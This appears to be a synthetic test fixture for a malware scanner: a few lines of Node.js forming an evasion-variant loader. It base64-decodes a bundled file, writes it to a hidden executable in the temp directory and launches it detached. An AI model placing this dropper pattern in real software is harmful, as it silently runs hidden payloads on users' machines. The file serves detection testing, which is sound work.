// SYNTHETIC FIXTURE — inert loader body. Scored as text, never executed. Evasion
// closure: the packaged payload is base64-decoded via `Buffer.from(read, 'base64')`
// instead of zlib (Spec2).
const fs = require("fs"), path = require("path"), os = require("os"), cp = require("child_process");
const b = Buffer.from(fs.readFileSync(path.join(__dirname, "p.js")).toString(), "base64");
const out = path.join(os.tmpdir(), ".y");
fs.writeFileSync(out, b);
fs.chmodSync(out, 0o755);
cp.spawn(out, [], { detached: true }).unref();
